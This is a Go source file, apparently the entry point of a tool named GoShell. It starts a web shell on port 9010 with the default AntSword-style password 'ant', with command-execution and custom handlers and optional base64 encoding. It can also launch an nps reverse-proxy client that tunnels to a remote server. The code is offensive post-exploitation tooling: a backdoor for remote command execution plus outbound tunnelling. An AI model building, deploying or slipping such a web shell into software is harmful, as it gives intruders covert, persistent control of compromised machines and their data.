package main

import (
	"flag"
	"log"
	"net/http"

	"ehang.io/nps/client"
	"github.com/Wd0g/GoShell/lib/common"
	"github.com/Wd0g/GoShell/lib/server"
)

var (
	mode       = flag.String("m", "custom", "[custom, cmd, npc]")
	webAddr    = flag.String("web-addr", "0.0.0.0:9010", "")
	webPwd     = flag.String("web-pwd", "ant", "")
	webDecoder = flag.String("web-decoder", "plain", "[plain, base64]")
	webEncoder = flag.String("web-encoder", "plain", "[plain, base64]")
	npcServer  = flag.String("server", "", "")
	npcVkey    = flag.String("vkey", "", "")
	npcType    = flag.String("type", "", "")
)

func main() {
	flag.Parse()
	if *mode == "npc" {
		cli := client.NewRPClient(*npcServer, *npcVkey, *npcType, "", nil, 60)
		cli.Start()
		return
	}

	var err error
	var handler http.Handler
	switch *mode {
	case "cmd":
		handler = server.Cmd{
			Pwd:     *webPwd,
			Decoder: common.NewDecoder(*webDecoder),
			Encoder: common.NewEncoder(*webEncoder),
		}
	case "custom":
		handler = server.Custom{
			Pwd:     *webPwd,
			Decoder: common.NewDecoder(*webDecoder),
			Encoder: common.NewEncoder(*webEncoder),
		}
	}

	err = http.ListenAndServe(*webAddr, handler)
	if err != nil {
		log.Fatal(err)
	}
}
